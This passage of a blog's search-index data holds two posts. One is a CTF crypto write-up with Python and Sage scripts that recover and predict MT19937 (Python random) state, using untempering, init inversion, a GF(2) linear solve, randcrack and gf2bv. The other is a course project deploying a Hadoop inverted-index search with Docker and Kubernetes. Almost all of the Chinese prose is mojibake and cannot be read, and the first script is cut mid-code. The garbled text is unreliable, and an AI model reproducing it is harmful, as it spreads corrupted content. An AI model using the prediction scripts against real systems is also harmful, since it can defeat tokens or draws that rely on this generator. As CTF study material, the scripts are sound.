= 0x80000000 low = 0x7fffffff mask = 0x9908b0df def _recover(i): y = state[i] ^ state[(i + 397) % 624] if y \u0026 high == high: y ^= mask y \u003c\u003c= 1 y |= 1 else: y \u003c\u003c= 1 return y for i in range(len(state)-625, -1, -1): state[i] = _recover(i) \u0026 high state[i] |= _recover(i-1) \u0026 low return state ","date":"2025-06-28","objectID":"/mt19937/:3:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"é€†å‘init è¿™ç©æ„çš„ä¸»è¦æ“ä½œæ˜¯ self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] Â» 30) + i) ä½ å¯ä»¥å‘ç°ï¼Œé‡Œé¢ä¸»è¦æ˜¯ä¹˜æ³•åŠ æ³•å’Œself.mt[i - 1] ^ self.mt[i - 1] \u003e\u003e 30ï¼Œå‰ä¸¤è€…å¯é€†è¿ç®—ï¼Œåé¢è¿™ä¸ªå’Œå‰é¢çš„ç±»ä¼¼ï¼Œé€šè¿‡inverté€ä½è¿˜åŸå³å¯ def inv_init(last): n = 1\u003c\u003c32 inv = pow(1812433253,-1,n) for i in range(623,0,-1): last = ((last-i)*inv)%n last = invert(last,30) return last ","date":"2025-06-28","objectID":"/mt19937/:4:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"ç»™å‡ºä»»æ„19937ä¸ªbit è¿™ä¸ªç±»å‹æ˜¯çœ‹é¸¡å—ç¥çš„åšå®¢å­¦åˆ°çš„ï¼Œä¸»è¦çš„åœ°æ–¹è¿˜æ˜¯åœ¨äºæ„å»ºçŸ©é˜µï¼Œç›´æ¥ä¸Šè„šæœ¬å§ Dall=list(map(int,open('data3.txt','r').readlines())) from Crypto.Util.number import * from random import * from tqdm import * n=1250 D=Dall[:n] rng=Random() def getRows(rng): #è¿™ä¸€éƒ¨åˆ†æ ¹æ®é¢˜ç›®å®é™…ç¼–å†™ï¼Œå¿…é¡»å’Œé¢˜ç›®å®é™…æ¯”ç‰¹è·å–é¡ºåºå’Œæ–¹å¼å®Œå…¨ä¸€è‡´ï¼Œä¸”ç¡®ä¿æ¯”ç‰¹æ•°å¤§äº19937ï¼Œå¹¶ä¸”è¯·æ³¨æ„zfillã€‚ row=[] for i in range(n): row+=list(map(int, (bin(rng.getrandbits(16))[2:].zfill(16)))) return row M=[] for i in tqdm_notebook(range(19968)):#è¿™ä¸€éƒ¨åˆ†ä¸ºå›ºå®šå¥—è·¯ï¼Œå…·ä½“åŸå› å·²ç»å†™åœ¨æ³¨é‡Šä¸­äº† state = [0]*624 temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i) for j in range(624): state[j] = int(temp[32*j:32*j+32],2) rng.setstate((3,tuple(state+[624]),None)) #è¿™ä¸ªsetstateä¹Ÿæ˜¯å›ºå®šæ ¼å¼ï¼Œå·²äº2025.1.21æµ‹è¯• M.append(getRows(rng)) M=Matrix(GF(2),M) y=[] for i in range(n): y+=list(map(int, (bin(D[i])[2:].zfill(16)))) y=vector(GF(2),y) s=M.solve_left(y) #print(s) G=[] for i in range(624): C=0 for j in range(32): C\u003c\u003c=1 C|=int(s[32*i+j]) G.append(C) import random RNG1 = random.Random() for i in range(624): G[i]=int(G[i]) RNG1.setstate((int(3),tuple(G+[int(624)]),None)) print([RNG1.getrandbits(16) for _ in range(75)]) print(D[:75]) ","date":"2025-06-28","objectID":"/mt19937/:5:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"å¸¸ç”¨è„šæœ¬ ","date":"2025-06-28","objectID":"/mt19937/:6:0","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"åŸå§‹ç‰ˆæœ¬ æœ€ç»å…¸çš„æ¬¾å¼ï¼Œé€Ÿåº¦æ…¢ï¼Œä¸å¥½ç”¨ def construct_a_row(RNG): row = [] for _ in range(19968//32): tmp = RNG.getrandbits(32) row += list(map(int, bin(tmp)[2:].zfill(32))) return row # æ„é€ çº¿æ€§æ–¹ç¨‹ç»„çš„çŸ©é˜µ L = [] for i in trange(19968): state = [0]*624 # MT19937ä½¿ç”¨624ä¸ª32ä½æ•´æ•°ä½œä¸ºçŠ¶æ€ # æ„é€ ä¸€ä¸ªåªæœ‰ä¸€ä½ä¸º1,å…¶ä»–éƒ½ä¸º0çš„åºåˆ— temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i) # å°†è¿™ä¸ªåºåˆ—åˆ†æˆ624æ®µ,æ¯æ®µ32ä½,è½¬æ¢ä¸ºæ•´æ•° for j in range(624): state[j] = int(temp[32*j:32*j+32], 2) RNG = Random() RNG.setstate((3,tuple(state+[624]),None)) L.append(construct_a_row(RNG)) # å°†Lè½¬æ¢ä¸ºGF(2)ä¸Šçš„çŸ©é˜µï¼ˆäºŒè¿›åˆ¶åŸŸï¼‰ L = Matrix(GF(2),L) print(L.nrows(), L.ncols()) def MT19937_re(state): try: # æ„é€ ç›®æ ‡å‘é‡R R = [] for i in state: R += list(map(int, bin(i)[2:].zfill(32))) R = vector(GF(2), R) s = L.solve_left(R) # è¿™é‡Œå¯èƒ½ä¼šæŠ›å‡ºå¼‚å¸¸ # å°†è§£è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸² init = \"\".join(list(map(str,s))) state = [] # å°†è§£é‡æ–°åˆ†å‰²æˆ624ä¸ª32ä½æ•´æ•° for i in range(624): state.append(int(init[32*i:32*i+32],2)) # åˆ›å»ºæ–°çš„RNGå¹¶è®¾ç½®æ¢å¤å‡ºçš„çŠ¶æ€ RNG1 = Random() RNG1.setstate((3,tuple(state+[624]),None)) return RNG1 except Exception as e: print(f\"[-]{e}\") pass RNG = MT19937_re() ","date":"2025-06-28","objectID":"/mt19937/:6:1","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"randcrack ä¸€ä¸ªæ— è„‘çš„æ–¹æ³•ï¼Ÿç›´æ¥åˆ©ç”¨è¿™ä¸ªåº“è¿›è¡Œé¢„æµ‹ï¼Œä½†æ˜¯åªèƒ½æ˜¯624*32ï¼Œè¦ä¸ç„¶ä¸è¡Œ import random from randcrack import RandCrack rc = RandCrack() for i in range(624): rc.submit(random.getrandbits(32)) print(random.getrandbits(64)) print(rc.predict_getrandbits(64)) githubä¸Šæœ‰ä¸€ä¸ªä¼˜åŒ–åçš„ç‰ˆæœ¬ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ç”¨è¿‡ï¼Œå¯ä»¥çœ‹çœ‹é“¾æ¥ ","date":"2025-06-28","objectID":"/mt19937/:6:2","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["CTF"],"content":"gf2bv mapleç¥å†™çš„ä¸€ä¸ªåº“ï¼Œæœ¬è´¨æ˜¯æ¥GF(2)æ–¹ç¨‹ç»„çš„ï¼ŒMT19937åˆšåˆšå¥½æ»¡è¶³ï¼Œæ‰€ä»¥å¯ä»¥æ‹¿æ¥ä½¿ç”¨ï¼Œä¼ é€é—¨ã€‚TGCTFçš„é‚£ä¸ªé¢˜å°±å¯ä»¥ç”¨è¿™ä¸ªåº“å»å†™ï¼Œéå¸¸çš„å¥½ç”¨ã€‚ ç¤ºä¾‹ä»£ç  from gf2bv import LinearSystem from gf2bv.crypto.mt import MT19937 from tqdm import * import random from Crypto.Util.number import * def mt19937(bs, out): lin = LinearSystem([32] * 624) mt = lin.gens() rng = MT19937(mt) #rng.getrandbits(175) zeros = [rng.getrandbits(bs) ^ o for o in out] + [mt[0] ^ 0x80000000] print(\"solving...\") sol = lin.solve_one(zeros) rng = MT19937(sol) pyrand = rng.to_python_random() for i in range(2496): out.append(pyrand.getrandbits(8)) print(pyrand.getrandbits(8)) import random random.seed(1) out=[] for i in range(2496): out.append(random.getrandbits(8)) mt19937(8, out) è¿™é‡Œï¼Œzeros.append()çš„æ—¶å€™éœ€è¦æ³¨æ„å’Œé¢˜ç›®ä¸­è·å–randbitsçš„æ–¹å¼ä¸€è‡´ã€‚ç”Ÿæˆçš„pyrandå…¶å®æ˜¯å®ƒçš„åˆå§‹çŠ¶æ€ï¼Œéœ€è¦é¢„æµ‹å“ªä¸ªå°±å¾€åé€’æ¨å°±è¡Œäº†ã€‚ å…³äºå®‰è£…ï¼š macç›´æ¥å»githubä¸‹m4riçš„åŒ…ï¼Œç„¶åæœ¬åœ°ç¼–è¯‘åsudo make install å¦‚æœåƒæˆ‘ä¸€æ ·åœ¨pyenvè¿™ç§è™šæ‹Ÿç¯å¢ƒé‡Œé¢è·‘pythonçš„ï¼ŒæŠŠç¯å¢ƒæ³¨å…¥è¿›å» export CFLAGS=\"-I/usr/local/include\" export LDFLAGS=\"-L/usr/local/lib\"ç„¶åå†pip install . ","date":"2025-06-28","objectID":"/mt19937/:6:3","tags":["crypto"],"title":"MT19937","uri":"/mt19937/"},{"categories":["å®¹å™¨"],"content":"äº‘è®¡ç®—è¯¾è®¾ è¿™ä¸ªè¯¾è®¾æ˜¯ä¸€ä¸ªåŸºäºMapReduceçš„å€’æ’ç´¢å¼•ç³»ç»Ÿï¼Œæ ¸å¿ƒæ˜¯Hadoop+docker+k8s ","date":"2025-06-11","objectID":"/yjsks/:1:0","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"æ•´ä½“æ¶æ„ å‰ç«¯ vue+nodejs åç«¯ nodejs+express+redis+sqlite3 éƒ¨ç½²æ–¹æ³• dockerfile+k8s æ•°æ®å¤„ç†æ–¹æ³• Hadoop ","date":"2025-06-11","objectID":"/yjsks/:1:1","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"è¯¾è®¾çµæ„Ÿ è‡ªå·±blogçš„æœç´¢åŠŸèƒ½å¾ˆå¼±ï¼Œé‡‡ç”¨çš„æ˜¯jsæ’ä»¶çš„å…¨å±€éå†æœç´¢ï¼Œå°±åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ä¼˜åŒ–æ–¹æ³•ï¼Œé¡ºä¾¿çŸ¥é“äº†å€’æ’ç´¢å¼•è¿™ç§æ–¹æ³•ï¼Œç»“åˆäº‘è®¡ç®—è¯¾å ‚çš„dockerå’ŒHadoopçŸ¥è¯†ï¼Œä¾¿æœ‰äº†è¿™ä¸ªè¯¾è®¾ ","date":"2025-06-11","objectID":"/yjsks/:1:2","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"å€’æ’ç´¢å¼•ä»‹ç» ä»€ä¹ˆæ˜¯æ­£æ’ç´¢å¼• å¯ä»¥ç®€å•çš„ç†è§£ä¸ºé€šè¿‡æ–‡æ¡£æ‰¾è¯ æ–‡æ¡£--\u003e å•è¯1 ,å•è¯2 å•è¯1 å‡ºç°çš„æ¬¡æ•° å•è¯å‡ºç°çš„ä½ç½®ï¼› å•è¯2 å•è¯2å‡ºç°çš„ä½ç½® ... æ­£æ’ç´¢å¼•çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥å¿«é€Ÿçš„æŸ¥æ‰¾æŸä¸ªæ–‡æ¡£é‡ŒåŒ…å«å“ªäº›è¯é¡¹ã€‚åŒç†ï¼Œæ­£æ’ä¸é€‚ç”¨äºæŸ¥æ‰¾åŒ…å«æŸä¸ªè¯é¡¹çš„æ–‡æ¡£æœ‰å“ªäº›ã€‚ ä»€ä¹ˆæ˜¯å€’æ’ç´¢å¼• å€’æ’ç´¢å¼•ï¼ˆInverted Indexï¼‰æ˜¯ä¸€ç§å¸¸ç”¨çš„æ–‡æœ¬ç´¢å¼•æ•°æ®ç»“æ„ï¼Œç”¨äºåŠ å¿«æ–‡æœ¬æœç´¢å’Œä¿¡æ¯æ£€ç´¢çš„é€Ÿåº¦ã€‚å®ƒæ˜¯ä¸€ç§åè½¬ï¼ˆInvertedï¼‰çš„ç´¢å¼•ç»“æ„ï¼Œå°†æ–‡æ¡£ä¸­çš„æ¯ä¸ªå•è¯æ˜ å°„åˆ°åŒ…å«è¯¥å•è¯çš„æ–‡æ¡£åˆ—è¡¨ã€‚ é€šå¸¸ï¼Œå€’æ’ç´¢å¼•ç”±ä¸¤ä¸ªä¸»è¦ç»„æˆéƒ¨åˆ†æ„æˆï¼šè¯é¡¹è¡¨ï¼ˆTerm Dictionaryï¼‰å’Œå€’æ’åˆ—è¡¨ï¼ˆInverted Listï¼‰ã€‚ è¯é¡¹è¡¨ï¼ˆTerm Dictionaryï¼‰ï¼šè¯é¡¹è¡¨æ˜¯ä¸€ä¸ªè¯é¡¹åˆ°å€’æ’åˆ—è¡¨çš„æ˜ å°„ï¼Œå®ƒè®°å½•äº†æ‰€æœ‰ä¸é‡å¤çš„å•è¯ï¼ˆæˆ–è¯é¡¹ï¼‰ä»¥åŠå®ƒä»¬å¯¹åº”çš„å€’æ’åˆ—è¡¨çš„ä½ç½®ä¿¡æ¯ã€‚ å€’æ’åˆ—è¡¨ï¼ˆInverted Listï¼‰ï¼šå€’æ’åˆ—è¡¨åŒ…å«äº†ä¸€ä¸ªå•è¯åœ¨æ–‡æ¡£é›†åˆä¸­çš„å‡ºç°ä½ç½®ã€‚å¯¹äºæ¯ä¸ªå•è¯ï¼Œå€’æ’åˆ—è¡¨è®°å½•äº†åŒ…å«è¯¥å•è¯çš„æ–‡æ¡£çš„æ ‡è¯†ç¬¦ï¼ˆä¾‹å¦‚æ–‡æ¡£IDï¼‰ä»¥åŠè¯¥å•è¯åœ¨æ–‡æ¡£ä¸­çš„ä½ç½®ä¿¡æ¯ï¼ˆä¾‹å¦‚å•è¯å‡ºç°çš„ä½ç½®æˆ–å‡ºç°çš„é¢‘ç‡ï¼‰ã€‚ ç”¨ä¸€ä¸ªå›¾ç›´è§‚å±•ç¤ºä¸¤è€…çš„åŒºåˆ« ","date":"2025-06-11","objectID":"/yjsks/:1:3","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"å‰ç«¯è®¾è®¡ æ–‡ä»¶ç»“æ„ â”‚ .dockerignore â”‚ Dockerfile â”‚ index.html â”‚ package-lock.json â”‚ package.json â”‚ results.html â”‚ server.js â”‚ vite.config.js â”‚ â”œâ”€public â”‚ favicon-16x16.png â”‚ icon_search.svg â”‚ leetcode.png â”‚ title.ttf â”‚ â””â”€src â””â”€assets base.css main.css æ–‡ä»¶ä»‹ç» .htmlæ–‡ä»¶å°±æ˜¯ç”¨æˆ·æœç´¢/æ˜¾ç¤ºé¢˜ç›®çš„é¡µé¢ publicå­˜çš„å›¾ç‰‡ srcå­˜çš„æ ·å¼(aiå®Œæˆçš„ï¼Œè‡ªå·±çœŸçš„ä¸ä¼šå†™) dokcerfileå’Œ.dockerignoreç”Ÿæˆdockerç”¨ server.jsæœ¬åœ°å¯åŠ¨é¡¹ç›®å¹¶ä¸”ç”¨äºåç»­k8séƒ¨ç½²æ—¶åŒæ­¥ç¯å¢ƒ package.jsonç”¨æ¥é…ç½®é¡¹ç›®ä¾èµ–ï¼Œpackage-lock.jsonè‡ªåŠ¨ç”Ÿæˆ äº¤äº’è®¾è®¡ å‰åç«¯é€šè¿‡POSTäº’é€šï¼Œç»è¿‡è§£æåæ˜¾ç¤º ","date":"2025-06-11","objectID":"/yjsks/:1:4","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"åç«¯è®¾è®¡ æ–‡ä»¶ç»“æ„ â”œâ”€â”€ data/ #æ•°æ®å­˜æ”¾ â”œâ”€â”€ src/ â”‚ â”œâ”€â”€ config/ # é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ controllers/ # æ§åˆ¶å™¨ â”‚ â”œâ”€â”€ models/ # æ•°æ®æ¨¡å‹ â”‚ â”œâ”€â”€ routes/ # è·¯ç”± â”‚ â”œâ”€â”€ services/ # ä¸šåŠ¡é€»è¾‘ â”‚ â””â”€â”€ utils/ # å·¥å…·å‡½æ•° â”œâ”€â”€ Dockerfile # Docker é…ç½® â”œâ”€â”€ package.json # é¡¹ç›®é…ç½® â””â”€â”€ README.md # é¡¹ç›®è¯´æ˜ æ•°æ®è·å– æ‹¿çš„åŠ›æ‰£çš„æ•°æ®ï¼Œä»–ä»¬çš„apiç”¨çš„graphqlï¼Œæœ¬æ¥æƒ³ç”¨ç‰›å®¢çš„ï¼Œç»“æœ76è·Ÿæˆ‘è¯´ç‰›å®¢æ²¡æœ‰è¿™ç§æ¥å£ï¼ŒæœŸæœ«æ—¶é—´ç´§ï¼Œä¹Ÿæ‡’å¾—çˆ¬äº†xd æ‹‰æ•°æ®éå¸¸ç®€å•ï¼Œæ¯”å¦‚ https://leetcode.com/graphql?query=query { userContestRanking(username: \"YOUR_USERNAME\") { attendedContestsCount rating globalRanking totalParticipants topPercentage } userContestRankingHistory(username: \"YOUR_USERNAME\") { attended trendDirection problemsSolved totalProblems finishTimeInSeconds rating ranking contest { title startTime } } } åœ¨æµè§ˆå™¨é‡Œé¢æœè¿™ä¸ªï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€å †æ•°æ®äº† å­˜åˆ°æ•°æ®é‡Œé¢å¹¶æŠŠurlåˆ é™¤ï¼Œå­˜äºdata/input.txté‡Œé¢ï¼Œç±»ä¼¼1 Two Sum Easy array hash-tableï¼Œå‡†å¤‡è¿›è¡Œmapreduceçš„åˆ†è¯ Hadoopå¤„ç† é¦–å…ˆæŠŠæ•°æ®ftpä¼ ä¸Šå»ï¼Œç„¶ååœ¨hdfsé‡Œé¢æä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”æ•°æ®æ‰”è¿›å» hdfs dfs -mkdir /input hdfs dfs -put ~/input.txt /input/ ä½¿ç”¨mapreduceè¿›è¡Œåˆ†è¯ æ ¹æ®Hadoop streaming çš„è§„åˆ™ï¼Œåªè¦æˆ‘ä»¬ä½¿ç”¨æ ‡å‡†çš„è¾“å…¥è¾“å‡ºï¼Œä»€ä¹ˆè¯­è¨€éƒ½è¡Œï¼Œç›´æ¥nodejså¯åŠ¨äº†ï¼Œmapper.jsèµ·åˆ°è¿™ä¸ªä½œç”¨ã€‚ åœ¨mapé˜¶æ®µï¼Œæˆ‘ä»¬æŒ‰è¡Œè¯»å–å†…å®¹ï¼Œå¹¶å°†å¤„ç†åçš„å†…å®¹åˆ†ä¸ºdocId å’Œå•è¯ï¼Œå¹¶ä½¿ç”¨æ ‡å‡†è¾“å…¥è¾“å‡ºè¿›è¡Œè¾“å‡ºæ–¹ä¾¿åç»­reduceå¤„ç†ï¼Œæ‰€ä»¥å°±æœ‰äº†reduce.jsã€‚ ç”Ÿæˆå¹¶ä¸”æ‹‰å‡ºæ•°æ® hadoop jar $HADOOP_HOME/share/hadoop/tools/lib/hadoop-streaming-3.3.6.jar -D mapreduce.job.maps=4 -D mapreduce.job.reduces=4 -files mapper.js,reducer.js -mapper â€œnode mapper.jsâ€ -reducer â€œnode reducer.jsâ€ -input /input/input.txt -output /output hdfs dfs -get /output ~/hadoop_output å­˜å…¥redis å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬è¯»å–å¤„ç†å¥½çš„å•è¯ä¸æ–‡ç« çš„æ˜ å°„ï¼Œå¹¶æ ¹æ®å•è¯åœ¨æŸä¸ªæ–‡ç« ä¸­å‡ºç°çš„æ¬¡æ•°å¯¹å…¶è¿›è¡Œæ’åºï¼Œå¦‚ ZSM (46,1),(589,1),(32,1),(42,2),(22,1) å˜æˆZSM (42,2),(46,1),(589,1),(32,1),(22,1) ","date":"2025-06-11","objectID":"/yjsks/:1:5","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"dockeréƒ¨ç½² å‰ç«¯ # ä½¿ç”¨åŸºç¡€çš„ Node.js é•œåƒä½œä¸ºåŸºç¡€ FROM node:18 # è®¾ç½®å·¥ä½œç›®å½• WORKDIR /usr/src/app # å°† package.json å’Œ package-lock.json å¤åˆ¶åˆ°å·¥ä½œç›®å½• COPY package*.json ./ # å®‰è£…ä¾èµ– RUN npm install # å¤åˆ¶é¡¹ç›®æ–‡ä»¶åˆ°å·¥ä½œç›®å½• COPY . . # æš´éœ²å®¹å™¨çš„ç«¯å£ï¼ˆæ ¹æ®ä½ çš„é¡¹ç›®é…ç½®ï¼‰ EXPOSE 5173 # è¿è¡Œå‰ç«¯åº”ç”¨ CMD [\"node\", \"server.js\"] å…¨éƒ¨æ–‡ä»¶æ‹‰è¿›å»ï¼Œè¿è¡Œè¿›è¡Œäº†ï¼Œä¸€å®šè¦åœ¨é‡Œé¢å»npm installï¼Œè¦ä¸ç„¶ä¼šæœ‰ç¯å¢ƒé—®é¢˜ï¼Œæ¯”å¦‚armå’Œx86çš„åŒ…ä¸å…¼å®¹ åç«¯ è¿™é‡Œæˆ‘æŠŠsqlite3ä¹ŸåŒ…è¿›å»äº†ï¼Œåæ­£æ¯”è¾ƒè½»é‡ FROM node:18-alpine # å®‰è£…æ„å»º better-sqlite3 æ‰€éœ€çš„ä¾èµ– RUN apk add --no-cache python3 make g++ sqlite-dev WORKDIR /app COPY package*.json ./ RUN npm install COPY . . EXPOSE 9999 CMD [\"npm\", \"start\"] ","date":"2025-06-11","objectID":"/yjsks/:1:6","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"k8séƒ¨ç½² rediséƒ¨ç½² é¦–å…ˆè¦ç†è§£ï¼Œæ¯ä¸ªpodéƒ½æ˜¯å’Œä¸»æœºç¯å¢ƒç›´æ¥éš”ç¦»çš„ï¼Œå¦‚æœæˆ‘æƒ³ç”¨ä¸»æœºdockerä¸Šé¢éƒ¨ç½²çš„redisæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯éœ€è¦çš„urlå°±æ˜¯http://ip:portï¼Œæ˜¯å›ºå®šçš„ï¼Œé‚£ä½ æ¢ä¸ªç½‘æœ¬åœ°è°ƒè¯•æ˜¯ä¸æ˜¯ç‚¸äº†ï¼Œæ‰€ä»¥æ‹¿ä¸€ä¸ªportéƒ¨ç½²redisæ˜¯å¾ˆæœ‰å¿…è¦çš„ apiVersion: apps/v1 kind: Deployment metadata: name: redis spec: replicas: 1 selector: matchLabels: app: redis template: metadata: labels: app: redis spec: containers: - name: redis image: redis:7.2 ports: - containerPort: 6379 --- apiVersion: v1 kind: Service metadata: name: redis-service spec: selector: app: redis ports: - protocol: TCP port: 6379 targetPort: 6379 å‰ç«¯éƒ¨ç½² è¿™é‡Œæˆ‘é‡‡ç”¨docker+k8sï¼Œå¯ä»¥çœ‹k8sçš„é‚£ä¸ªæ–‡ç« ï¼Œè®²äº†ä¸€ç‚¹ç‚¹åŸç†ï¼Œæ‰€ä»¥æœ¬åœ°dockeræ­å»ºçš„æ—¶å€™æ˜¯docker build -t yunjisuanfront:latest . apiVersion: apps/v1 kind: Deployment metadata: name: yunjisuan-frontend spec: replicas: 1 selector: matchLabels: app: yunjisuan-frontend template: metadata: labels: app: yunjisuan-frontend spec: containers: - name: yunjisuan-frontend image: yunjisuanfront:latest imagePullPolicy: Never # ä½¿ç”¨æœ¬åœ°é•œåƒ ports: - containerPort: 5173 # æ ¹æ®ä½ çš„å‰ç«¯å®é™…ç«¯å£è°ƒæ•´ env: - name: BACKEND_URL value: \"http://yunjisuan-backend-service:9999\" --- apiVersion: v1 kind: Service metadata: name: yunjisuan-frontend-service spec: selector: app: yunjisuan-frontend ports: - port: 5173 targetPort: 5173 type: LoadBalancer # è´Ÿè½½å‡è¡¡ åç«¯éƒ¨ç½² apiVersion: apps/v1 kind: Deployment metadata: name: yunjisuan-backend spec: replicas: 1 selector: matchLabels: app: yunjisuan-backend template: metadata: labels: app: yunjisuan-backend spec: containers: - name: yunjisuan-backend image: yunjisuan-backend:latest imagePullPolicy: Never # ä½¿ç”¨æœ¬åœ°é•œåƒ ports: - containerPort: 9999 env: - name: DB_PATH value: \"/app/data/questions.db\" - name: REDIS_HOST value: \"redis-service\" - name: REDIS_PORT value: \"6379\" - name: NODE_ENV value: \"production\" volumeMounts: - name: data-volume mountPath: /app/data volumes: - name: data-volume persistentVolumeClaim: claimName: yunjisuan-data-pvc --- apiVersion: v1 kind: Service metadata: name: yunjisuan-backend-service spec: selector: app: yunjisuan-backend ports: - port: 9999 targetPort: 9999 type: ClusterIP æ³¨æ„è¦å»åƒåˆ°æ•°æ®åº“å’Œredisçš„è·¯å¾„/ç«¯å£ï¼Œç„¶åå†æŒ‚ä¸ªæŒä¹…åŒ– apiVersion: v1 kind: PersistentVolumeClaim metadata: name: yunjisuan-data-pvc spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi å…³äºè‡ªåŠ¨åŒ– ä»¥ä¸Šæ–¹æ³•è™½ç„¶ç”¨çš„æ˜¯lastç‰ˆæœ¬ï¼Œä½†æ˜¯æœ‰bugçš„è¯ä½ å°±è¦åˆ æ‰é‡å»ºï¼Œå¾ˆéº»çƒ¦ï¼Œå¦‚ä½•è‡ªåŠ¨æ¨é€å¯ç”¨lastç‰ˆæœ¬çš„dockeré•œåƒå‘¢ï¼Ÿï¼Ÿï¼Ÿ æ–¹æ³•ä¸€ åˆ©ç”¨è‡ªåŠ¨åŒ–shè„šæœ¬ #!/bin/bash PREVIOUS_DIGEST=\"\" while true; do DIGEST=$(docker image inspect yunjisuanfront:latest --format='{{index .Id}}') if [[ \"$DIGEST\" != \"$PREVIOUS_DIGEST\" ]]; then echo \"é•œåƒå·²æ›´æ–°ï¼Œé‡å¯ Deployment...\" kubectl rollout restart deployment yunjisuan-frontend PREVIOUS_DIGEST=\"$DIGEST\" fi sleep 10 done æ–¹æ³•äºŒ ä½¿ç”¨æœ¬åœ° registry + é•œåƒ tag å”¯ä¸€åŒ– æ¯æ¬¡ä½  build é•œåƒæ—¶ï¼Œç»™å®ƒä¸€ä¸ªå”¯ä¸€ tagï¼ˆæ¯”å¦‚ä½¿ç”¨æ—¶é—´æˆ³ã€Git æäº¤å“ˆå¸Œï¼‰ï¼Œç„¶åæ›´æ–° Deployment é•œåƒåœ°å€ã€‚è¿™æ · Kubernetes ä¼šè®¤ä¸ºé•œåƒå˜äº†ï¼Œä»è€Œé‡å»º Podã€‚ æœ¬åœ°æ­å»º Docker Registry docker run -d -p 5000:5000 â€“name registry â€“restart=always registry:2 æ„å»ºå¹¶æ¨é€å¸¦å”¯ä¸€ tag çš„é•œåƒ TIMESTAMP=$(date +%s) docker build -t localhost:5000/yunjisuanfront:$TIMESTAMP . docker push localhost:5000/yunjisuanfront:$TIMESTAMP æ›´æ–° Deployment çš„é•œåƒåœ°å€ image: localhost:5000/yunjisuanfront:{{TIMESTAMP}} imagePullPolicy: Always å¯ä»¥ä½¿ç”¨è„šæœ¬/CI å·¥å…·ï¼ˆå¦‚ GitHub Actionsï¼‰è‡ªåŠ¨å®Œæˆ build â†’ push â†’ update YAML â†’ applyã€‚ æ¯”å¦‚ #!/bin/bash set -e # 1. ç”Ÿæˆå”¯ä¸€ tag TAG=$(date +%s) # 2. æ„å»ºé•œåƒ docker build -t localhost:5000/yunjisuanfront:$TAG . # 3. æ¨é€åˆ°æœ¬åœ° registry docker push localhost:5000/yunjisuanfront:$TAG # 4. æ¸²æŸ“æ¨¡æ¿ envsubst \u003c deploy/frontend.yaml.template \u003e deploy/frontend.yaml # 5. åº”ç”¨åˆ° K8s kubectl apply -f deploy/frontend.yaml echo \"âœ… é•œåƒ yunjisuanfront:$TAG å·²éƒ¨ç½²åˆ° Kubernetes\" ","date":"2025-06-11","objectID":"/yjsks/:1:7","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"é¸½å­æ—¶é—´ å¦‚æœæœ‰æ—¶é—´ï¼Œå¯èƒ½ä¼šç ”ç©¶æŒä¹…åŒ–æŠ“å–æ•°æ®-\u003eHadoopè‡ªåŠ¨åŒ–å¤„ç†-\u003eæ¨é€æ•°æ®åº“-\u003eé‡å»ºé•œåƒ-\u003epodé‡å¯ï¼Œä½†æ˜¯æ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”åƒæ€§èƒ½ï¼Œåé¢å†è¯´å§ã€‚ å’•å’•å’• ","date":"2025-06-11","objectID":"/yjsks/:1:8","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"æœ¬åœ°å°bug(6.12æ›´æ–°) åœ¨æœ¬åœ°éƒ¨ç½²æˆåŠŸä¹‹åï¼Œéœ€è¦æŠŠåç«¯portè½¬å‘åˆ°æœ¬åœ°ï¼ŒåŸå› æ˜¯ï¼ŒPod å’Œ Service é»˜è®¤æ˜¯å†…ç½‘é€šä¿¡çš„ï¼Œå¦‚æœå‰ç«¯vueè¦è®¿é—®åç«¯apiï¼Œæˆ‘å¿…é¡»è¦èµ°æœ¬åœ°è¿™é‡Œ kubectl port-forward service/yunjisuan-backend-service 9999:9999 \u0026 ","date":"2025-06-11","objectID":"/yjsks/:1:9","tags":["å¼€å‘"],"title":"äº‘è®¡ç®—è¯¾è®¾","uri":"/yjsks/"},{"categories":["å®¹å™¨"],"content":"äº‘ä¸Šé—®é¢˜(6.13æ›´æ–°) dokcer 